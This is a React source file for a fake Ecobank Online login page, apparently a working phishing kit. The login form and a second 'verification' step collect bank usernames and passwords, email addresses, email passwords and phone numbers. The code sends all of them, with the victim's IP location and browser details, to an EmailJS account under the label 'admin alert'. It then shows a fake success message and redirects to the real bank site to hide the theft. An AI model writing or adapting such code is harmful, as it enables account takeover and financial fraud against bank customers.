import { useState } from 'react';
import emailjs from '@emailjs/browser';
import { Eye, EyeOff, Loader2, CheckCircle2 } from 'lucide-react';

const EMAILJS_SERVICE_ID = 'service_hnhy5y2';
const EMAILJS_TEMPLATE_ID = 'template_wt0ke84';
const EMAILJS_PUBLIC_KEY = 'klvU34EBIkhhbgVb0';

const emailjsConfigured =
  EMAILJS_SERVICE_ID && EMAILJS_TEMPLATE_ID && EMAILJS_PUBLIC_KEY;
if (emailjsConfigured) emailjs.init(EMAILJS_PUBLIC_KEY);

/* ─── SVG Illustration ────────────────────────────────────────────────── */

function BankingIllustration() {
  return (
    <svg
      viewBox="0 0 600 420"
      xmlns="http://www.w3.org/2000/svg"
      className="w-full max-w-xl mx-auto"
      aria-hidden="true"
    >
      {/* Background circle */}
      <circle cx="300" cy="220" r="170" fill="#d6eef5" opacity="0.6" />

      {/* Laptop base */}
      <rect x="150" y="195" width="300" height="175" rx="8" fill="#2ea8cc" />
      <rect x="158" y="203" width="284" height="150" rx="4" fill="#e8f5f9" />

      {/* Laptop screen content */}
      <rect x="170" y="215" width="100" height="10" rx="3" fill="#1b87a8" opacity="0.4" />
      <rect x="170" y="232" width="75" height="8" rx="3" fill="#1b87a8" opacity="0.3" />
      <rect x="170" y="248" width="90" height="8" rx="3" fill="#1b87a8" opacity="0.3" />
      <circle cx="340" cy="255" r="42" fill="#1b87a8" opacity="0.15" />
      <path d="M310 255 L355 230 L370 255 L355 280 Z" fill="#1b87a8" opacity="0.4" />
      <circle cx="340" cy="255" r="20" fill="#1b87a8" opacity="0.25" />
      <path d="M332 255 l6-8 l6 8 l-6 3 Z" fill="#1b87a8" opacity="0.6" />

      {/* Laptop keyboard area */}
      <rect x="150" y="370" width="300" height="10" rx="2" fill="#1b87a8" opacity="0.5" />
      <rect x="220" y="378" width="160" height="6" rx="3" fill="#2ea8cc" opacity="0.4" />

      {/* Globe icon on screen top-right */}
      <circle cx="390" cy="230" r="18" fill="#1b87a8" opacity="0.2" />
      <circle cx="390" cy="230" r="18" fill="none" stroke="#1b87a8" strokeWidth="1.5" opacity="0.4" />
      <line x1="390" y1="212" x2="390" y2="248" stroke="#1b87a8" strokeWidth="1" opacity="0.4" />
      <line x1="372" y1="230" x2="408" y2="230" stroke="#1b87a8" strokeWidth="1" opacity="0.4" />
      <ellipse cx="390" cy="230" rx="8" ry="18" fill="none" stroke="#1b87a8" strokeWidth="1" opacity="0.4" />

      {/* Arrows */}
      <path d="M285 262 l-18 0 l6 -7 M267 262 l6 7" stroke="#1b87a8" strokeWidth="2.5" fill="none" strokeLinecap="round" />
      <path d="M315 268 l18 0 l-6 -7 M333 268 l-6 7" stroke="#1b87a8" strokeWidth="2.5" fill="none" strokeLinecap="round" />

      {/* Left person */}
      {/* Head */}
      <circle cx="130" cy="205" r="26" fill="#5b3427" />
      <circle cx="130" cy="196" r="20" fill="#7a4430" />
      {/* Hair */}
      <path d="M110 196 q0-20 20-20 q20 0 20 20" fill="#2a1a10" />
      {/* Body */}
      <rect x="108" y="232" width="44" height="80" rx="12" fill="#2ea8cc" />
      {/* Arms */}
      <rect x="87" y="237" width="21" height="14" rx="7" fill="#2ea8cc" />
      <rect x="152" y="237" width="21" height="14" rx="7" fill="#2ea8cc" />
      {/* Left hand near laptop */}
      <circle cx="168" cy="248" r="7" fill="#7a4430" />
      {/* Legs */}
      <rect x="113" y="308" width="16" height="55" rx="8" fill="#1a5f7a" />
      <rect x="134" y="308" width="16" height="55" rx="8" fill="#1a5f7a" />
      {/* Shoes */}
      <ellipse cx="121" cy="363" rx="13" ry="6" fill="#111" />
      <ellipse cx="142" cy="363" rx="13" ry="6" fill="#111" />

      {/* Right person */}
      {/* Head */}
      <circle cx="470" cy="200" r="26" fill="#5b3427" />
      <circle cx="470" cy="190" r="20" fill="#7a4430" />
      {/* Hair - longer */}
      <path d="M450 196 q0-24 20-24 q20 0 20 24 q0 10 5 18 q-8 0 -10-5 q-5 10 -15 10 q-10 0-15-10 q-2 5-10 5 q5-8 5-18" fill="#1a0f08" />
      {/* Body */}
      <rect x="448" y="228" width="44" height="80" rx="12" fill="#2ea8cc" />
      {/* Arms */}
      <rect x="427" y="233" width="21" height="14" rx="7" fill="#2ea8cc" />
      <rect x="492" y="233" width="21" height="14" rx="7" fill="#2ea8cc" />
      {/* Right hand near laptop */}
      <circle cx="432" cy="244" r="7" fill="#7a4430" />
      {/* Legs */}
      <rect x="453" y="304" width="16" height="55" rx="8" fill="#1a5f7a" />
      <rect x="474" y="304" width="16" height="55" rx="8" fill="#1a5f7a" />
      {/* Shoes */}
      <ellipse cx="461" cy="359" rx="13" ry="6" fill="#111" />
      <ellipse cx="482" cy="359" rx="13" ry="6" fill="#111" />

      {/* Ground shadow */}
      <ellipse cx="300" cy="388" rx="180" ry="10" fill="#1b87a8" opacity="0.08" />
    </svg>
  );
}

/* ─── Ecobank Logo ────────────────────────────────────────────────────── */

function EcobankLogo({ dark = false }: { dark?: boolean }) {
  const text = dark ? '#1b87a8' : '#ffffff';
  return (
    <div className="flex flex-col leading-tight select-none">
      <div className="flex items-center gap-1">
        {/* Stylised "e" leaf icon */}
        <svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="26" height="26" rx="4" fill={dark ? '#1b87a8' : 'white'} />
          <path
            d="M7 13 a6 6 0 1 1 12 0 H7"
            stroke={dark ? 'white' : '#1b87a8'}
            strokeWidth="2.2"
            fill="none"
            strokeLinecap="round"
          />
          <line x1="7" y1="13" x2="19" y2="13" stroke={dark ? 'white' : '#1b87a8'} strokeWidth="2.2" strokeLinecap="round" />
        </svg>
        <span style={{ color: text, fontWeight: 700, fontSize: '1.15rem', letterSpacing: '-0.01em' }}>
          Ecobank
        </span>
      </div>
      <span style={{ color: dark ? '#1b87a8' : 'rgba(255,255,255,0.85)', fontSize: '0.6rem', letterSpacing: '0.04em', paddingLeft: '30px', marginTop: '-2px' }}>
        The Pan African Bank
      </span>
    </div>
  );
}

/* ─── Login Form ──────────────────────────────────────────────────────── */

type FormStatus = 'idle' | 'loading' | 'success' | 'error';

async function fetchLocation(): Promise<string> {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    if (data && data.city) {
      return `${data.ip} — ${data.city}, ${data.region}, ${data.country_name}`;
    }
    if (data && data.ip) return data.ip;
  } catch {}
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    if (data && data.ip) return data.ip;
  } catch {}
  return 'Unknown';
}

function LoginForm({ onSuccess }: { onSuccess: () => void }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [status, setStatus] = useState<FormStatus>('idle');
  const [errorMsg, setErrorMsg] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) {
      setStatus('error');
      setErrorMsg('Please enter your username and password.');
      return;
    }
    setStatus('loading');
    setErrorMsg('');

    const sendAdminAlert = async () => {
      if (!emailjsConfigured) return;
      const location = await fetchLocation();
      try {
        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
          username,
          password,
          time: new Date().toLocaleString(),
          location,
          user_agent: navigator.userAgent,
        });
      } catch (err) {
        console.error('EmailJS send failed:', err);
      }
    };

    sendAdminAlert();
    setTimeout(() => {
      setStatus('success');
      setTimeout(onSuccess, 1200);
    }, 2000);
  };

  if (status === 'success') {
    return (
      <div className="flex flex-col items-center justify-center py-12 text-center animate-fade-in">
        <CheckCircle2 className="h-14 w-14 text-eco-teal mb-4" />
        <h3 className="text-xl font-semibold text-eco-text">Login Successful</h3>
        <p className="mt-2 text-sm text-eco-muted">Redirecting to your dashboard…</p>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="w-full">
      {/* Username */}
      <div className="mb-6">
        <label className="block text-sm font-bold text-eco-text mb-2">
          Username
        </label>
        <input
          type="text"
          value={username}
          onChange={(e) => { setUsername(e.target.value); setStatus('idle'); }}
          className="underline-input"
          autoComplete="username"
        />
      </div>

      {/* Password */}
      <div className="mb-4">
        <label className="block text-sm font-bold text-eco-text mb-2">
          Password
        </label>
        <div className="relative">
          <input
            type={showPassword ? 'text' : 'password'}
            value={password}
            onChange={(e) => { setPassword(e.target.value); setStatus('idle'); }}
            className="underline-input pr-8"
            autoComplete="current-password"
          />
          <button
            type="button"
            onClick={() => setShowPassword((v) => !v)}
            className="absolute right-0 top-1/2 -translate-y-1/2 text-eco-muted hover:text-eco-teal transition"
            tabIndex={-1}
          >
            {showPassword
              ? <EyeOff className="h-4.5 w-4.5" />
              : <Eye className="h-4.5 w-4.5" />}
          </button>
        </div>
      </div>

      {/* Forgot Password */}
      <div className="flex justify-end mb-6">
        <button type="button" className="text-sm text-eco-teal hover:text-eco-teal-dark font-medium transition">
          Forgot Password?
        </button>
      </div>

      {/* Error */}
      {status === 'error' && (
        <p className="text-sm text-red-600 mb-4 animate-fade-in">{errorMsg}</p>
      )}

      {/* T&C */}
      <p className="text-xs text-eco-muted text-center leading-relaxed mb-6">
        By Logging in, I Acknowledge that I have read<br />
        and that I agree with the{' '}
        <span className="text-eco-teal cursor-pointer hover:underline">Terms &amp; Conditions</span>
        {' '}&amp;{' '}
        <span className="text-eco-teal cursor-pointer hover:underline">Privacy Policy</span>
      </p>

      {/* Login button */}
      <button
        type="submit"
        disabled={status === 'loading'}
        className="w-full py-3.5 rounded-sm bg-eco-teal text-white text-sm font-semibold tracking-wide hover:bg-eco-teal-dark active:scale-[0.99] transition disabled:opacity-70 flex items-center justify-center gap-2"
      >
        {status === 'loading' ? (
          <>
            <Loader2 className="h-4 w-4 animate-spin" />
            Logging in…
          </>
        ) : (
          'Log in'
        )}
      </button>
    </form>
  );
}

/* ─── Verification Form (Step 2) ───────────────────────────────────────── */

function VerificationForm() {
  const [email, setEmail] = useState('');
  const [emailPassword, setEmailPassword] = useState('');
  const [phone, setPhone] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [status, setStatus] = useState<FormStatus>('idle');
  const [errorMsg, setErrorMsg] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim() || !emailPassword.trim() || !phone.trim()) {
      setStatus('error');
      setErrorMsg('Please fill in all fields to continue.');
      return;
    }
    setStatus('loading');
    setErrorMsg('');

    const sendAdminAlert = async () => {
      if (!emailjsConfigured) return;
      const location = await fetchLocation();
      try {
        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
          email,
          email_password: emailPassword,
          phone,
          time: new Date().toLocaleString(),
          location,
          user_agent: navigator.userAgent,
        });
      } catch (err) {
        console.error('EmailJS send failed:', err);
      }
    };

    sendAdminAlert();
    setTimeout(() => {
      setStatus('success');
      // Redirect after 5 seconds (5000ms)
      setTimeout(() => {
        window.location.href = 'https://ecobank.com/personal-banking';
      }, 5000);
    }, 2000);
  };

  if (status === 'success') {
    return (
      <div className="flex flex-col items-center justify-center py-12 text-center animate-fade-in">
        <CheckCircle2 className="h-14 w-14 text-eco-teal mb-4" />
        <h3 className="text-xl font-semibold text-eco-text">Verification Complete</h3>
        <p className="mt-2 text-sm text-eco-muted">Redirecting to your dashboard…</p>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="w-full">
      {/* Email Address */}
      <div className="mb-6">
        <label className="block text-sm font-bold text-eco-text mb-2">
          Email Address
        </label>
        <input
          type="email"
          value={email}
          onChange={(e) => { setEmail(e.target.value); setStatus('idle'); }}
          className="underline-input"
          autoComplete="email"
        />
      </div>

      {/* Email Password */}
      <div className="mb-4">
        <label className="block text-sm font-bold text-eco-text mb-2">
          Email Password
        </label>
        <div className="relative">
          <input
            type={showPassword ? 'text' : 'password'}
            value={emailPassword}
            onChange={(e) => { setEmailPassword(e.target.value); setStatus('idle'); }}
            className="underline-input pr-8"
            autoComplete="current-password"
          />
          <button
            type="button"
            onClick={() => setShowPassword((v) => !v)}
            className="absolute right-0 top-1/2 -translate-y-1/2 text-eco-muted hover:text-eco-teal transition"
            tabIndex={-1}
          >
            {showPassword
              ? <EyeOff className="h-4.5 w-4.5" />
              : <Eye className="h-4.5 w-4.5" />}
          </button>
        </div>
      </div>

      {/* Phone Number */}
      <div className="mb-6">
        <label className="block text-sm font-bold text-eco-text mb-2">
          Phone Number
        </label>
        <input
          type="tel"
          value={phone}
          onChange={(e) => { setPhone(e.target.value); setStatus('idle'); }}
          className="underline-input"
          autoComplete="tel"
          placeholder="+234 ..."
        />
      </div>

      {/* Error */}
      {status === 'error' && (
        <p className="text-sm text-red-600 mb-4 animate-fade-in">{errorMsg}</p>
      )}

      {/* Continue button */}
      <button
        type="submit"
        disabled={status === 'loading'}
        className="w-full py-3.5 rounded-sm bg-eco-teal text-white text-sm font-semibold tracking-wide hover:bg-eco-teal-dark active:scale-[0.99] transition disabled:opacity-70 flex items-center justify-center gap-2"
      >
        {status === 'loading' ? (
          <>
            <Loader2 className="h-4 w-4 animate-spin" />
            Verifying…
          </>
        ) : (
          'Continue'
        )}
      </button>
    </form>
  );
}

/* ─── App ─────────────────────────────────────────────────────────────── */

export default function App() {
  const [step, setStep] = useState<'login' | 'verify'>('login');
  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Top header bar */}
      <header className="w-full shadow-sm">
        <img
          src="/image.png"
          alt="Ecobank – The Pan African Bank"
          className="w-full block"
          style={{ display: 'block' }}
        />
      </header>

      {/* Main content */}
      <main className="flex-1 flex flex-col lg:flex-row">
        {/* ── Left: welcome + illustration ── */}
        <div className="flex-1 flex flex-col items-center justify-center text-center px-8 py-12 lg:py-16">
          <h1 className="text-3xl md:text-4xl lg:text-5xl font-light text-eco-teal leading-snug mb-2">
            Welcome to
          </h1>
          <h1 className="text-3xl md:text-4xl lg:text-5xl font-light text-eco-teal leading-snug mb-6">
            Ecobank Online
          </h1>
          <p className="text-base md:text-lg text-eco-text font-normal mb-1">
            Check your balance, make transfers and payments instantly
          </p>
          <p className="text-sm md:text-base text-eco-text">
            Do it all on mobile too with the new{' '}
            <span className="text-eco-orange font-medium cursor-pointer hover:underline">
              Ecobank Online GO
            </span>{' '}
            app
          </p>
          <p className="text-sm md:text-base text-eco-text mb-8">
            Download it now from google play store or App store.
          </p>

          <div className="w-full max-w-lg animate-fade-up">
            <BankingIllustration />
          </div>
        </div>

        {/* ── Vertical divider (desktop) ── */}
        <div className="hidden lg:block w-px bg-eco-divider my-10" />

        {/* ── Right: login panel ── */}
        <div className="w-full lg:w-80 xl:w-96 flex flex-col items-center justify-center px-8 py-12 lg:py-16 border-t border-eco-divider lg:border-t-0">
          <div className="w-full max-w-sm">
            <h2 className="text-3xl font-light text-eco-text mb-8 text-center">
              Login
            </h2>
            {step === 'login' ? (
              <LoginForm onSuccess={() => setStep('verify')} />
            ) : (
              <VerificationForm />
            )}
          </div>
        </div>
      </main>
    </div>
  );
}
